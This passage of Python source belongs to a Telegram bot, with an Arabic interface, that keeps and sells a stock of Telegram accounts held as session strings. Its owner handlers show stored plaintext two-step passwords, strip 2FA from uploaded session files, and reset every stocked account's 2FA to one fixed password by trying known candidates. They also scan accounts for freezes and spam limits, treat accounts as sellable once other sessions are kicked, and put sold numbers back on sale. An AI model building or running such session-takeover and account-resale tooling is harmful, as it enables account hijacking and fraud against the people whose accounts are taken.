                    "SELECT phone_number, session_string, twofa_password, added_at, "
                    "last_authorized, last_device_count, ever_sold, assigned_to "
                    "FROM number_stock WHERE phone_number=%s", (_phone_info,)
                ).fetchone()
            if not _row_info:
                await q.edit_message_text(f"⚠️ الرقم `{_phone_info}` غير موجود في المخزون.", parse_mode=ParseMode.MARKDOWN)
                return
            _devices_info = _row_info["last_device_count"] or "؟"
            _auth_info    = "✅ نشطة" if _row_info["last_authorized"] else "❌ منتهية"
            _sold_info    = "مباع" if _row_info["ever_sold"] else "غير مباع"
            _pwd_info     = f"`{_row_info['twofa_password']}`" if _row_info["twofa_password"] else "غير محفوظة"
            _added_info   = format_account_datetime(_row_info["added_at"]) if _row_info["added_at"] else "؟"
            text_info = (
                f"📋 *معلومات الحساب*\n\n"
                f"📱 الرقم: `{_phone_info}`\n"
                f"🌍 الدولة: {guess_country(_phone_info)}\n"
                f"📅 أُضيف: {_added_info}\n"
                f"🔗 الجلسة: {_auth_info}\n"
                f"📲 الأجهزة: {_devices_info}\n"
                f"💰 الحالة: {_sold_info}\n"
                f"🔐 كلمة 2FA: {_pwd_info}"
            )
            await q.edit_message_text(text_info, parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("✅ سماح 5 دقائق", callback_data=f"os:allow_5min:{_phone_info}"),
                    InlineKeyboardButton("🚪 مغادرة البوت", callback_data=f"os:leave_account:{_phone_info}"),
                ]]))
        except Exception as _ei:
            await q.edit_message_text(f"❌ خطأ أثناء جلب المعلومات: {_ei}", parse_mode=ParseMode.MARKDOWN)
        return

    # ── مغادرة البوت (حذف الحساب من المخزون) ──
    if data.startswith("os:leave_account:") and is_own:
        _phone_leave = data[len("os:leave_account:"):]
        await q.answer()
        try:
            await _stop_number_monitor(_phone_leave)
        except Exception:
            pass
        try:
            with db_conn() as _cl:
                _cl.execute("DELETE FROM number_stock WHERE phone_number=%s", (_phone_leave,))
            await q.edit_message_text(
                f"🚪 *تم حذف الحساب من المخزون*\n\n"
                f"📱 الرقم: `{_phone_leave}`\n"
                f"البوت أنهى كل علاقته بهذا الحساب.",
                parse_mode=ParseMode.MARKDOWN
            )
            logger.info(f"🚪 os:leave_account: تم حذف الرقم {_phone_leave} من المخزون.")
        except Exception as _el:
            await q.edit_message_text(f"❌ فشل حذف الحساب: {_el}", parse_mode=ParseMode.MARKDOWN)
        return

    # ── وضع إزالة التحقق (2FA) من ملفات الجلسة ──
    if data == "os:remove_2fa_mode" and is_own:
        context.user_data["state"] = "os_remove_2fa_mode"
        await q.edit_message_text(
            "🔓 *وضع إزالة التحقق الثنائي*\n\n"
            "أرسل ملفات الجلسة (`.session` أو `.json`) واحداً تلو الآخر.\n"
            "البوت سيزيل التحقق الثنائي (2FA) من كل حساب تُرسله.\n\n"
            "💡 يعمل مع: Telethon SQLite، Pyrogram JSON، StringSession JSON\n\n"
            "أرسل /start أو اضغط رجوع للخروج من هذا الوضع.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 رجوع للمخزون", callback_data="os:manage_numbers")
            ]])
        )
        return

    # ── تعيين كلمة مرور 'محمد' لجميع حسابات المخزون ──
    if data == "os:set_all_2fa_muhammed" and is_own:
        target_pw = OWNER_FIXED_2FA_PASSWORD or "محمد"
        if not target_pw:
            await q.answer("⚠️ متغير TWOFA_PASSWORD غير مضبوط في البيئة.", show_alert=True)
            return
        with db_conn() as c:
            rows = c.execute(
                "SELECT id, phone_number, session_string, twofa_password "
                "FROM number_stock WHERE session_string IS NOT NULL AND deleted_at IS NULL"
            ).fetchall()
        if not rows:
            await q.answer("✅ لا توجد حسابات بجلسة في المخزون.", show_alert=True)
            return
        await q.edit_message_text(
            f"⏳ *جاري تعيين كلمة المرور '{target_pw}' على {len(rows)} حساب...*\n\n"
            "سيصلك تقرير عند الانتهاء.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 رجوع للمخزون", callback_data="os:manage_numbers")
            ]])
        )

        async def _set_all_2fa_bg():
            done, skipped, failed = [], [], []
            for rec in rows:
                phone   = rec["phone_number"]
                sess    = rec["session_string"]
                old_pw  = rec["twofa_password"] or ""
                stock_id = rec["id"]

                # إذا كانت كلمة المرور هي بالفعل 'محمد' في DB — تخطّ
                if old_pw == target_pw:
                    skipped.append(phone)
                    continue

                cli = None
                try:
                    cli = TelegramClient(StringSession(sess), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
                    await asyncio.wait_for(cli.connect(), timeout=20)
                    if not await asyncio.wait_for(cli.is_user_authorized(), timeout=10):
                        failed.append(f"{phone}: جلسة منتهية")
                        continue

                    pwd_state = await cli(GetPasswordRequest())
                    _expected_2fa_change[phone] = time.time()

                    if not pwd_state.has_password:
                        # لا يوجد 2FA — نُعيّن مباشرة
                        await cli.edit_2fa(new_password=target_pw, hint="Auto")
                    else:
                        # يوجد 2FA — جرّب الكلمة المخزّنة أولاً ثم الكلمة الثابتة
                        candidates = []
                        if old_pw and old_pw != target_pw:
                            candidates.append(old_pw)
                        # لو الكلمة الثابتة غير موجودة في القائمة أصلاً
                        if target_pw not in candidates:
                            candidates.append(target_pw)
                        changed = False
                        for cand_pw in candidates:
                            try:
                                await cli.edit_2fa(current_password=cand_pw, new_password=target_pw, hint="Auto")
                                changed = True
                                break
                            except Exception as _pe:
                                if "PASSWORD_HASH_INVALID" in str(_pe).upper() or "SRP_ID_INVALID" in str(_pe).upper():
                                    continue
                                raise
                        if not changed:
                            failed.append(f"{phone}: كلمة المرور غير معروفة")
                            continue

                    # حفظ في DB
                    with db_conn() as _uc:
                        _uc.execute(
                            "UPDATE number_stock SET twofa_password=%s, auto_2fa_enabled=TRUE WHERE id=%s",
                            (target_pw, stock_id)
                        )
                    done.append(phone)
                except Exception as _e:
                    failed.append(f"{phone}: {_e}")
                finally:
                    try:
                        if cli: await cli.disconnect()
                    except Exception:
                        pass
                await asyncio.sleep(1)  # لتجنب flood

            # تقرير النتيجة
            lines = [f"🔑 *نتيجة تعيين كلمة المرور '{target_pw}':*\n"]
            lines.append(f"✅ تم ({len(done)}) / ⏭ مخطّى ({len(skipped)}) / ❌ فشل ({len(failed)})")
            if done:
                lines.append("\n*✅ نجح:*")
                lines.extend(f"  • `{p}`" for p in done[:30])
                if len(done) > 30: lines.append(f"  ... و{len(done)-30} آخرين")
            if failed:
                lines.append("\n*❌ فشل:*")
                lines.extend(f"  • {x}" for x in failed[:20])
            try:
                await context.bot.send_message(
                    OWNER_ID, "\n".join(lines), parse_mode=ParseMode.MARKDOWN
                )
            except Exception:
                pass

        asyncio.create_task(_set_all_2fa_bg())
        return

    if data == "os:release_all_numbers" and is_own:
        with db_conn() as c:
            rows = c.execute(
                "SELECT phone_number FROM number_stock WHERE assigned_to IS NOT NULL AND deleted_at IS NULL"
            ).fetchall()
            count = len(rows)
            if count == 0:
                await q.answer("✅ لا توجد أرقام مباعة حالياً.", show_alert=True)
                return
            # نُعيد تعيين ever_sold=FALSE حتى تصبح الأرقام قابلة للبيع من جديد
            c.execute(
                "UPDATE number_stock SET assigned_to=NULL, assigned_at=NULL, "
                "force_listed=FALSE, ever_sold=FALSE "
                "WHERE assigned_to IS NOT NULL AND deleted_at IS NULL"
            )
        await q.edit_message_text(
            f"✅ *تم إرجاع {count} رقم للبيع بنجاح!*\n\n"
            f"جميع الأرقام المحددة أصبحت متاحة للشراء من جديد.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع للمخزون", callback_data="os:manage_numbers")],
            ])
        )
        return

    if data == "os:scan_all_numbers" and is_own:
        await q.edit_message_text(
            "🔍 *بدأ فحص جميع الحسابات...*\n\n"
            "سيصلك تقرير عند الانتهاء (عادةً أقل من دقيقة).",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:manage_numbers")]])
        )

        async def _scan_one(rec) -> dict:
            """يفحص رقماً واحداً ويُرجع نتيجة مختصرة. محاط بـ timeout=25ث."""
            phone_r  = rec["phone_number"]
            sess_r   = rec["session_string"]
            saved_pw = rec["twofa_password"] or ""
            result   = {"phone": phone_r, "id": rec["id"], "status": "ok", "note": "", "devs": 1}
            cli = None
            try:
                cli = TelegramClient(StringSession(sess_r), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
                await asyncio.wait_for(cli.connect(), timeout=15)

                if not await asyncio.wait_for(cli.is_user_authorized(), timeout=10):
                    result["status"] = "kicked"
                    result["note"] = "جلسة منتهية/مطرودة"
                    with db_conn() as _c:
                        _c.execute("UPDATE number_stock SET last_authorized=FALSE WHERE id=%s", (rec["id"],))
                    return result

                # فحص التجميد
                is_frz, frz_status, _ = await asyncio.wait_for(
                    check_account_frozen(cli, rec["id"]), timeout=10
                )
                if is_frz:
                    result["status"] = "frozen"
                    result["note"] = frz_status
                    return result

                # عدد الأجهزة (GetAuthorizationsRequest بدون wait_for — سريع عادةً)
                devs = await asyncio.wait_for(get_device_count(cli), timeout=10)
                result["devs"] = devs

                # فحص 2FA عبر GetPasswordRequest (المُستورد في أعلى الملف)
                pwd_state = await asyncio.wait_for(cli(GetPasswordRequest()), timeout=10)
                if pwd_state.has_password:
                    if saved_pw:
                        result["status"] = "ok"   # لدينا كلمة مرور محفوظة → بخير
                    else:
                        # 2FA مفعّل لكن كلمة المرور غير معروفة → نتحقق من الكلمة الثابتة
                        try:
                            verified = await asyncio.wait_for(
                                verify_current_2fa_password(cli, OWNER_FIXED_2FA_PASSWORD, phone=phone_r),
                                timeout=12
                            )
                        except asyncio.TimeoutError:
                            verified = None
                        if verified is True:
                            with db_conn() as _c:
                                _c.execute("UPDATE number_stock SET twofa_password=%s WHERE id=%s",
                                           (OWNER_FIXED_2FA_PASSWORD, rec["id"]))
                            result["status"] = "ok"
                        else:
                            result["status"] = "no_2fa"
                            result["note"] = "2FA مفعّل لكن كلمة المرور غير معروفة"
                else:
                    # 2FA غير مفعّل أصلاً
                    result["status"] = "no_2fa"
                    result["note"] = "2FA غير مفعّل"

            except asyncio.TimeoutError:
                result["status"] = "timeout"
                result["note"] = "انتهت مهلة الاتصال (25ث)"
            except Exception as e:
                result["status"] = "error"
                result["note"] = str(e)[:100]
            finally:
                try:
                    if cli:
                        await cli.disconnect()
                except Exception:
                    pass
            return result

        async def _run_full_scan():
            if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
                await context.bot.send_message(OWNER_ID, "❌ TELEGRAM_API_ID/HASH غير مضبوط — تعذّر الفحص.")
                return
            with db_conn() as _c:
                rows = _c.execute(
                    "SELECT id, phone_number, session_string, twofa_password "
                    "FROM number_stock WHERE session_string IS NOT NULL AND deleted_at IS NULL"
                ).fetchall()
            if not rows:
                await context.bot.send_message(OWNER_ID, "📭 لا توجد أرقام مضافة بجلسة للفحص.")
                return

            total = len(rows)
            ok_cnt = frz_cnt = kick_cnt = no_2fa_cnt = timeout_cnt = err_cnt = multi_dev_cnt = 0
            problem_lines = []
            needs_2fa_fix = []   # أرقام تحتاج تفعيل/تصحيح 2FA

            # ─── فحص واحد بالواحد لتجنب حظر Telegram من الاتصالات المتزامنة الكثيرة ───
            for rec in rows:
                res = await asyncio.wait_for(_scan_one(dict(rec)), timeout=30)
                st = res["status"]

                if st == "ok":
                    ok_cnt += 1
                    if res["devs"] > 1:
                        multi_dev_cnt += 1
                        problem_lines.append(f"📲 `{res['phone']}` — {res['devs']} أجهزة (يُفضَّل جهاز واحد)")
                elif st == "frozen":
                    frz_cnt += 1
                    problem_lines.append(f"🧊 `{res['phone']}` — مجمّد: {res['note']}")
                elif st == "kicked":
                    kick_cnt += 1
                    problem_lines.append(f"⚠️ `{res['phone']}` — {res['note']}")
                elif st == "no_2fa":
                    no_2fa_cnt += 1
                    problem_lines.append(f"🔑 `{res['phone']}` — {res['note']}")
                    needs_2fa_fix.append(res)
                elif st == "timeout":
                    timeout_cnt += 1
                    problem_lines.append(f"⏱ `{res['phone']}` — {res['note']}")
                else:
                    err_cnt += 1
                    problem_lines.append(f"❓ `{res['phone']}` — {res['note']}")

                await asyncio.sleep(0.4)   # فترة قصيرة بين الأرقام

            # ─── تفعيل 2FA للأرقام التي تحتاجه (في الخلفية بعد التقرير) ───
            async def _fix_2fa_later():
                for item in needs_2fa_fix:
                    with db_conn() as _c2:
                        row2 = _c2.execute(
                            "SELECT session_string FROM number_stock WHERE id=%s", (item["id"],)
                        ).fetchone()
                    if row2 and row2["session_string"]:
                        ok2, _, pwd2 = await enable_2fa_for_number(
                            item["phone"], row2["session_string"], item["id"], bot=context.bot
                        )
                        if not ok2:
                            await request_manual_2fa_password(context.bot, item["phone"], item["id"])
                    await asyncio.sleep(1)

            if needs_2fa_fix:
                asyncio.create_task(_fix_2fa_later())

            # ─── إرسال التقرير ───
            icons = []
            if ok_cnt:      icons.append(f"✅ سليمة: *{ok_cnt}*")
            if frz_cnt:     icons.append(f"🧊 مجمّدة: *{frz_cnt}*")
            if kick_cnt:    icons.append(f"⚠️ جلسة منتهية: *{kick_cnt}*")
            if no_2fa_cnt:  icons.append(f"🔑 مشكلة 2FA: *{no_2fa_cnt}*")
            if multi_dev_cnt: icons.append(f"📲 أجهزة متعددة: *{multi_dev_cnt}*")
            if timeout_cnt: icons.append(f"⏱ timeout: *{timeout_cnt}*")
            if err_cnt:     icons.append(f"❓ أخطاء: *{err_cnt}*")

            summary = (
                f"📊 *تقرير فحص جميع الحسابات*\n"
                f"الإجمالي المفحوص: *{total}*\n\n"
                + "\n".join(icons)
            )
            if problem_lines:
                detail = "\n".join(problem_lines[:25])
                if len(problem_lines) > 25:
                    detail += f"\n... و{len(problem_lines)-25} أخرى"
                summary += f"\n\n*التفاصيل:*\n{detail}"
            if needs_2fa_fix:
                summary += f"\n\n_⏳ جاري تفعيل/إصلاح 2FA على {len(needs_2fa_fix)} رقم في الخلفية..._"

            await context.bot.send_message(
                OWNER_ID, summary,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("📋 قائمة الأرقام", callback_data="os:list_numbers")
                ]])
            )

        asyncio.create_task(_run_full_scan())
        return

    if data == "os:list_numbers" and is_own:
        counts = get_number_counts()
        await q.edit_message_text(
            "📋 *قائمة الأرقام*\n\nاختر التصنيف الذي تريد عرض أرقامه ومعلوماتها التفصيلية:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"📦 جميع الأرقام ({counts['all']})", callback_data="os:nums:all")],
                [InlineKeyboardButton(f"🚀 الأرقام المعروضة ({counts['listed']})", callback_data="os:nums:listed")],
                [InlineKeyboardButton(f"⏳ الأرقام المنتظرة ({counts['pending']})", callback_data="os:nums:pending")],
                [InlineKeyboardButton(f"🛒 الحسابات المبيوعة ({counts.get('sold', 0)})", callback_data="os:sold_accounts")],
                [InlineKeyboardButton(f"🚫 الحسابات المطرودة ({counts['kicked']})", callback_data="os:nums:kicked")],
                [InlineKeyboardButton(f"🧊 قائمة المجمّدين ({counts.get('frozen', 0)})", callback_data="os:nums:frozen")],
                [InlineKeyboardButton(f"🔐 حسابات التحقق التلقائي ({counts.get('auto_2fa', 0)})", callback_data="os:nums:auto_2fa")],
                [InlineKeyboardButton(f"🗑 سلة المهملات ({counts['trash']})", callback_data="os:nums:trash")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="os:manage_numbers")],
            ])
        )
        return

    if data.startswith("os:nums:") and is_own:
        # ── تحليل filter_type ورقم الصفحة من callback_data ──
        # الصيغة: os:nums:{filter_type}  أو  os:nums:{filter_type}:{page}
        _parts = data.split(":")
        filter_type = _parts[2]
        _page = int(_parts[3]) if len(_parts) > 3 else 0
        _PAGE_SIZE = 30

        titles = {
            "all":      "📦 جميع الأرقام",
            "listed":   "🚀 الأرقام المعروضة",
            "pending":  "⏳ الأرقام المنتظرة",
            "kicked":   "🚫 الأرقام المطرودة",
            "trash":    "🗑 سلة المهملات",
            "frozen":   "🧊 قائمة المجمّدين",
            "auto_2fa": "🔐 حسابات التحقق التلقائي",
        }
        title   = titles.get(filter_type, "الأرقام")
        numbers = list_stock_numbers(filter_type)
        total   = len(numbers)

        if not total:
            empty_note = "لا توجد أرقام حالياً ضمن هذا التصنيف."
            if filter_type == "trash":
                empty_note = "سلة المهملات فارغة حالياً."
            elif filter_type == "kicked":
                empty_note = "✅ لا توجد أرقام مطرودة حالياً — كل الأرقام متصلة."
            elif filter_type == "frozen":
                empty_note = "✅ لا توجد حسابات مجمّدة حالياً — جميع الأرقام سليمة."
            elif filter_type == "auto_2fa":
                empty_note = "لا توجد حسابات قام البوت بتفعيل التحقق التلقائي عليها بعد."
            await q.edit_message_text(
                f"{title}\n\n{empty_note}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")]])
            )
            return

        # ── حساب نطاق الصفحة ──
        total_pages = (total + _PAGE_SIZE - 1) // _PAGE_SIZE
        _page       = max(0, min(_page, total_pages - 1))   # تثبيت في الحدود
        _start      = _page * _PAGE_SIZE
        _end        = _start + _PAGE_SIZE
        page_nums   = numbers[_start:_end]

        # ── دالة مساعدة لتنسيق التاريخ ──
        def _fmt_dt_pg(val):
            if val is None:
                return "غير مسجّل"
            if hasattr(val, "strftime"):
                return val.strftime("%Y-%m-%d %H:%M")
            return str(val)[:16]

        # ── أزرار التنقل بين الصفحات ──
        def _nav_row():
            nav = []
            if _page > 0:
                nav.append(InlineKeyboardButton("⬅️ السابق", callback_data=f"os:nums:{filter_type}:{_page - 1}"))
            if total_pages > 1:
                nav.append(InlineKeyboardButton(f"📄 {_page + 1}/{total_pages}", callback_data="noop"))
            if _page < total_pages - 1:
                nav.append(InlineKeyboardButton("التالي ➡️", callback_data=f"os:nums:{filter_type}:{_page + 1}"))
            return nav

        # ══════════════════════════════════════════════════════
        # ── عرض مخصص: الحسابات المجمّدة ──
        # ══════════════════════════════════════════════════════
        if filter_type == "frozen":
            lines_frz = [
                f"🧊 *{title} ({total})* — صفحة {_page + 1}/{total_pages}\n"
                "⛔ هذه الأرقام محظورة نهائياً من تيليغرام ولا يمكن بيعها.\n"
            ]
            for n in page_nums:
                lines_frz.append(
                    f"📱 `{n['phone_number']}` — {guess_country(n['phone_number'])}\n"
                    f"   📅 أُضيف للبوت: {_fmt_dt_pg(n.get('added_at'))}\n"
                    f"   🧊 تجمّد في:    {_fmt_dt_pg(n.get('frozen_at'))}"
                )
            text_frz = "\n\n".join(lines_frz)
            if len(text_frz) > 4000:
                text_frz = text_frz[:4000] + "\n\n_(النص مقتصر)_"
            btn_rows_frz = [[InlineKeyboardButton(
                f"📱 {n['phone_number']}", callback_data=f"os:number_info:{n['id']}"
            )] for n in page_nums]
            _nr = _nav_row()
            if _nr:
                btn_rows_frz.append(_nr)
            btn_rows_frz.append([InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")])
            await q.edit_message_text(text_frz, parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=InlineKeyboardMarkup(btn_rows_frz))
            return

        # ══════════════════════════════════════════════════════
        # ── عرض مخصص: حسابات التحقق التلقائي ──
        # ══════════════════════════════════════════════════════
        if filter_type == "auto_2fa":
            lines_2fa = [
                f"🔐 *{title} ({total})* — صفحة {_page + 1}/{total_pages}\n"
                "هذه الحسابات قام البوت بتفعيل كلمة مرور التحقق بخطوتين عليها تلقائياً.\n"
            ]
            for n in page_nums:
                has_pwd = "✅ محفوظة" if n.get("twofa_password") else "❌ غير محفوظة"
                lines_2fa.append(
                    f"📱 `{n['phone_number']}` — {guess_country(n['phone_number'])}\n"
                    f"   📅 أُضيف للبوت: {_fmt_dt_pg(n.get('added_at'))}\n"
                    f"   🔑 كلمة المرور: {has_pwd}"
                )
            text_2fa = "\n\n".join(lines_2fa)
            if len(text_2fa) > 4000:
                text_2fa = text_2fa[:4000] + "\n\n_(النص مقتصر)_"
            btn_rows_2fa = [[InlineKeyboardButton(
                f"📱 {n['phone_number']}", callback_data=f"os:number_info:{n['id']}"
            )] for n in page_nums]
            _nr = _nav_row()
            if _nr:
                btn_rows_2fa.append(_nr)
            btn_rows_2fa.append([InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")])
            await q.edit_message_text(text_2fa, parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=InlineKeyboardMarkup(btn_rows_2fa))
            return

        # ══════════════════════════════════════════════════════
        # ── عرض مخصص: الأرقام المطرودة ──
        # ══════════════════════════════════════════════════════
        if filter_type == "kicked":
            lines_kk = [f"🚫 *{title} ({total})* — صفحة {_page + 1}/{total_pages}\n"]
            for n in page_nums:
                lines_kk.append(
                    f"📱 `{n['phone_number']}` — {guess_country(n['phone_number'])}\n"
                    f"   📅 تسجيل: {_fmt_dt_pg(n.get('added_at'))}\n"
                    f"   🚫 طُرد:   {_fmt_dt_pg(n.get('kicked_at'))}"
                )
            text_kk = "\n\n".join(lines_kk)
            if len(text_kk) > 4000:
                text_kk = text_kk[:4000] + "\n\n_(النص مقتصر)_"
            btn_rows_kk = [[InlineKeyboardButton(
                f"📱 {n['phone_number']}", callback_data=f"os:number_info:{n['id']}"
            )] for n in page_nums]
            _nr = _nav_row()
            if _nr:
                btn_rows_kk.append(_nr)
            btn_rows_kk.append([InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")])
            await q.edit_message_text(text_kk, parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=InlineKeyboardMarkup(btn_rows_kk))
            return

        # ══════════════════════════════════════════════════════
        # ── العرض العام: all / listed / pending / trash ──
        # ══════════════════════════════════════════════════════
        def _is_sellable(n) -> bool:
            """نفس شروط _sellable_filter_sql() لكن على كائن Python."""
            return (
                bool(n.get("session_string"))
                and n.get("last_authorized") is not False
                and bool((n.get("twofa_password") or "").strip())
                and not n.get("frozen_at")
            )

        rows = []
        for n in page_nums:
            country = guess_country(n['phone_number'])
            if filter_type == "trash":
                label = f"🗑 {n['phone_number']} — {country}"
            elif not n.get("session_string"):
                label = f"⚠️ {n['phone_number']} — {country} (بدون جلسة)"
            elif n.get("frozen_at"):
                label = f"🧊 {n['phone_number']} — {country} (مجمّد)"
            elif n.get("last_authorized") is False:
                label = f"🚫 {n['phone_number']} — {country} (مطرود)"
            elif _is_sellable(n):
                label = f"✅ {n['phone_number']} — {country}"
            else:
                label = f"⏳ {n['phone_number']} — {country} (غير جاهز)"
            rows.append([InlineKeyboardButton(label, callback_data=f"os:number_info:{n['id']}")])
        _nr = _nav_row()
        if _nr:
            rows.append(_nr)
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")])

        # ─── تفسير الرموز ───
        if filter_type == "all":
            legend = "\n✅ جاهز للبيع  |  ⏳ غير جاهز  |  🚫 مطرود  |  🧊 مجمّد  |  ⚠️ بدون جلسة"
        elif filter_type == "listed":
            legend = "\n✅ هذه الأرقام جاهزة للبيع وتُسلَّم فوراً عند الشراء."
        elif filter_type == "pending":
            legend = "\n⏳ هذه الأرقام غير جاهزة — تحتاج جلسة أو 2FA أو طرد جلسات."
        else:
            legend = ""

        await q.edit_message_text(
            f"*{title} ({total})* — صفحة {_page + 1}/{total_pages}"
            f"{legend}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    if data.startswith("os:number_info:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec or (rec["assigned_to"] is not None and not rec.get("deleted_at")):
            await q.edit_message_text(
                "⚠️ هذا الرقم غير متاح (تم بيعه).",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")]])
            )
            return
        if rec.get("deleted_at"):
            # ─── الرقم في سلة المهملات: عرض مبسّط بدون فحص مباشر من تيليجرام + خيارات الاستعادة/الحذف النهائي ───
            del_str = rec["deleted_at"].strftime("%Y-%m-%d %H:%M UTC") if hasattr(rec["deleted_at"], "strftime") else str(rec["deleted_at"])
            await q.edit_message_text(
                f"🗑 *{rec['phone_number']}* — في سلة المهملات\n\n"
                f"🌍 الدولة: {guess_country(rec['phone_number'])}\n"
                f"📅 وقت الحذف: {del_str}\n",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("♻️ استعادة الرقم", callback_data=f"os:number_restore:{stock_id}")],
                    [InlineKeyboardButton("🗑 حذف نهائي (لا يمكن التراجع)", callback_data=f"os:number_purge:{stock_id}")],
                    [InlineKeyboardButton("🔙 رجوع", callback_data="os:nums:trash")],
                ])
            )
            return
        if not rec["session_string"]:
            await q.edit_message_text(
                f"📱 {rec['phone_number']}\n🌍 {guess_country(rec['phone_number'])}\n\n"
                "⚠️ هذا الرقم أُضيف يدوياً بدون تسجيل دخول، فلا تتوفر معلومات تفصيلية عنه (ولا يمكن جلب كود له).",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")]])
            )
            return
        await q.edit_message_text(f"⏳ يتم جلب معلومات {rec['phone_number']}... قد يستغرق ذلك بضع ثوانٍ.")
        client = TelegramClient(StringSession(rec["session_string"]), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        try:
            # ─── اتصال بـ timeout صريح حتى لا يعلّق البوت على جلسات ملغية ───
            try:
                await asyncio.wait_for(client.connect(), timeout=15)
            except asyncio.TimeoutError:
                await q.edit_message_text(
                    f"⏳ *انتهت مهلة الاتصال بـ {rec['phone_number']}*\n\n"
                    "السبب المحتمل: الجلسة ملغية أو الحساب محظور أو شبكة بطيئة.\n"
                    "جرّب مجدداً أو انقل الرقم إلى سلة المهملات.",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🗑 نقل إلى سلة المهملات", callback_data=f"os:number_delete:{stock_id}")],
                        [InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")],
                    ])
                )
                return

            # ─── تحقق من صلاحية الجلسة قبل أي طلب ───
            try:
                _authorized = await asyncio.wait_for(client.is_user_authorized(), timeout=8)
            except asyncio.TimeoutError:
                _authorized = False

            if not _authorized:
                await q.edit_message_text(
                    f"🔒 *الجلسة منتهية أو ملغية — {rec['phone_number']}*\n\n"
                    "البوت لم يعد مصرّحاً له بالوصول لهذا الحساب.\n"
                    "الرقم لن يُعرَض للبيع تلقائياً حتى تُحدَّث جلسته.",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🗑 نقل إلى سلة المهملات", callback_data=f"os:number_delete:{stock_id}")],
                        [InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")],
                    ])
                )
                return

            # ─── فحص التجميد أولاً ───
            is_frozen, frozen_status, frozen_at_str = await check_account_frozen(client, stock_id)
            me = None
            age = "غير معروف"
            if not is_frozen:
                try:
                    me = await asyncio.wait_for(client.get_me(), timeout=10)
                    age = estimate_registration_year(me.id) if me else "غير معروف"
                except Exception:
                    pass
            devices = await get_device_count(client)
            spam_detail = await check_spam_status_detailed(client)
            # ─── حالة التجميد المحفوظة في DB ───
            db_frozen_at = rec.get("frozen_at")
            if db_frozen_at and not frozen_at_str:
                if hasattr(db_frozen_at, "strftime"):
                    frozen_at_str = db_frozen_at.strftime("%Y-%m-%d %H:%M UTC")
                else:
                    frozen_at_str = str(db_frozen_at)
            # ─── حالة البيع ───
            if rec["force_listed"]:
                sale_status = "🚀 معروض مباشرة للبيع (تجاوز انتظار طرد الجلسات)"
            elif rec["sessions_reset"]:
                sale_status = "✅ جاهز للبيع (البوت وحده بالحساب)"
            else:
                sale_status = "⏳ بانتظار طرد الجلسات الأخرى — غير معروض للبيع بعد"
            # ─── اسم المستخدم ───
            display_name = ""
            if me:
                display_name = (
                    f"\n👤 الاسم: {(me.first_name or '')} {(me.last_name or '')}".rstrip()
                )
                if me.username:
                    display_name += f" (@{me.username})"
            # ─── معلومات التجميد/الحظر الكامل ───
            frozen_line = (
                f"\n🧊 جامد: {'✅ نعم' if is_frozen else '❌ لا'}"
                f"\n⛔ محظور بالكامل: {'✅ نعم' if is_frozen else '❌ لا'}"
            )
            if is_frozen and frozen_at_str:
                frozen_line += f"\n📅 تاريخ التجميد: {frozen_at_str}"
            # ─── حالة التقييد المؤقت من الإرسال ───
            restricted = spam_detail.get("restricted")
            if restricted is True:
                until_txt = spam_detail.get("until")
                spam_line = f"\n📵 مقيّد من الإرسال: ✅ نعم" + (f"\n⏳ ينتهي القيد: {until_txt}" if until_txt else "\n⏳ ينتهي القيد: غير محدد بدقة في رد تيليجرام")
            elif restricted is False:
                spam_line = f"\n📵 مقيّد من الإرسال: ❌ لا"
            else:
                spam_line = f"\n📵 مقيّد من الإرسال: ⚠️ تعذّر التأكد الآن"
            # ─── حالة 2FA ───
            saved_pwd = rec.get("twofa_password") or ""
            if saved_pwd:
                twofa_line = "\n🔐 التحقق بخطوتين: ✅ مفعّل (انظر زر كلمة المرور)"
            else:
                twofa_line = "\n🔐 التحقق بخطوتين: ❌ غير مفعّل / كلمة المرور غير محفوظة"
            text = (
                f"📱 *{rec['phone_number']}*"
                f"{display_name}\n"
                f"🌍 الدولة: {guess_country(rec['phone_number'])}\n"
                f"🕰️ عمر الحساب (تقريبي): {age}\n"
                f"💻 عدد الأجهزة المسجّلة: {devices if devices >= 0 else 'غير متاح'}"
                f"{frozen_line}"
                f"{spam_line}"
                f"{twofa_line}\n"
                f"🛒 حالة العرض للبيع: {sale_status}\n"
            )
